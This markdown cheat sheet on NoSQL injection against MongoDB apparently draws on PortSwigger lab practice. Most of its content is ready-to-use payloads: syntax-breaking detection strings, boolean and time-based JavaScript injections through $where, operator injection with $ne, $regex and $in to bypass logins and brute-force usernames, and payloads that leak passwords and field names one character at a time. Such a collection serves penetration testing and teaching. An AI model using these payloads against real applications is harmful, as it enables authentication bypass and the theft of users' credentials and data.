### Basic operator difference between SQLi && NoSQLi
  1. `or` >> `||`
  2. `and` >> `&&`
  3. `-- -` >> `%00`
---
### Detecting NoSQLi Vulnerability
**For MongoDB Detection:**
```
'%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
```
**Causing syntax error in MongoDB**
```
'
```
**Escaping the syntax error in MongoDB**
```
\'
```
**Injecting in JSON Format**
```
'\"`{\r;$Foo}\n$Foo \\xYZ\u0000
```
**Others :**
```
'+%26%26+1%3d%3d1%00
'+||+1%3d%3d1%00
'||1||'
'\"`{\r%3b$Foo}\n$Foo+\\xYZ\u0000
{"$where": "sleep(5000)"}
admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'
admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
```
### Confirming conditional behavior
```
' && 0 && 'x
' && 1 && 'x
' || 1 || 'x
'||'1'=='1
'%00
```
**Example with explanation :**

  1. ```category=Gifts' && 0 && 'x``` >> This will return no items like ```category=Gifts' and 1=0-- -``` in sql injection.
  2. ```category=Gifts' && 1 && 'x``` >> This will return Gift items like ```category=Gifts' and 1=1-- -``` in sql injection.
  3. ```category=Gifts' || 1 || 'x``` >> This will return all the items like ```category=Gifts' or 1=1-- -``` in sql injection.
  4. Same as 3.
### NoSQL operator injection

`$where` - Matches documents that satisfy a JavaScript expression.
<br>
`$ne` - Matches all values that are not equal to a specified value.
<br>
`$in` - Matches all of the values specified in an array.
<br>
`$regex` - Selects documents where values match a specified regular expression.
<br>
<br>
Details: [Portswigger](https://portswigger.net/web-security/nosql-injection#nosql-operator-injection)

### Submitting query operators
In JSON messages, you can insert query operators as nested objects. For example, `{"username":"wiener"}` becomes `{"username":{"$ne":"invalid"}}`.
<br>
<br>
For URL-based inputs, you can insert query operators via URL parameters. For example, `username=wiener` becomes `username[$ne]=invalid`.
<br>
<br>
If this doesn't work, you can try the following:
<br>
<br>
  `1.` Convert the request method from `GET` to `POST`.
  <br>
  `2.` Change the `Content-Type` header to `application/json`.
  <br>
  `3.` Add `JSON` to the `message body`.
  <br>
  `4.` Inject `query` operators in the `JSON`.
### MongoDB Login Bypass
```
{"$regex":"wien.*"} >> For username
{"$ne":"Invalid"} >> For password
{"$in":["admin","administrator","superadmin"]} >> For bruteforce
```
![Screenshot from 2024-07-12 03-55-31](https://github.com/user-attachments/assets/18902009-c2d8-4162-b5d8-7ebb221fd49e)
<br>
Note: We need to input atleast one valid credential to make a valid query.
<br>
If this doesn't work, you can try the following:

    1. Convert the request method from GET to POST.
    2. Change the Content-Type header to application/json.
    3. Add JSON to the message body.
    4. Inject query operators in the JSON.
### MongoDB Data Retrieving
Extracting Password:
```
' && this.password.length < 50%00 >> For extracting password length in URL
' && this.password[0] == 'a'%00 >> For extracting password in URL
{"username":"admin","password":{"$regex":"^a*"}} >> For extracting password via operator
```
### Identifying field names
```
' && this.anything && 'a'=='b >> Confirming if there is a field name
' && this.username!=' >> Identifying field names [Note: If there is a username field exists, it will response with different type of message]
' && this['u'] && 'a'=='b >> Retrieving field name character by character
' && this.u.s.e.r.n.a.m['e'] && 'a'=='b
```
### Operator Injection To Retrieving Unknown Data
```
{"username":{"$regex":"admin"},"password":{"$ne":"Invalid"}}
{"username":{"$regex":"admin"},"password":{"$ne":"Invalid"},"$where":"e"} >> To generate an server error.
{"username":{"$regex":"admin"},"password":{"$ne":"Invalid"},"$where":"0"} >> To generate a false statement.
{"username":{"$regex":"admin"},"password":{"$ne":"Invalid","$where":"1"}} >> To generate a true statement.
{"username":{"$regex":"admin"},"password":{"$ne":"Invalid"},"$where":"0"}  >>  {"username":{"$regex":"admin"},"password":{"$ne":"Invalid","$where":"Object.keys(this)[0].match('^.{0}.*')"}}
{"username":{"$regex":"admin"},"password":{"$ne":"Invalid"},"$where":"0"}  >>  {"username":{"$regex":"admin"},"password":{"$ne":"Invalid","$where":"Object.keys(this)[0].match('^.{0}0.*')"}}

Object.keys(this)[0].match('^.{0}.*') >> To identify data size. Ex: Password
Object.keys(this)[0].match('^.{0}0.*') >> To fetch the data
this.forgotpwd.match('^.{0}.*') >> To fetch specific keyvalue data size.
this.forgotpwd.match('^.{0}0.*') >> To fetch specific keyvalue.

1st 0 means key number
2nd 0 means data size
3rd 0 means data character
For bruteforcing select only 2nd and 3rd 0
```
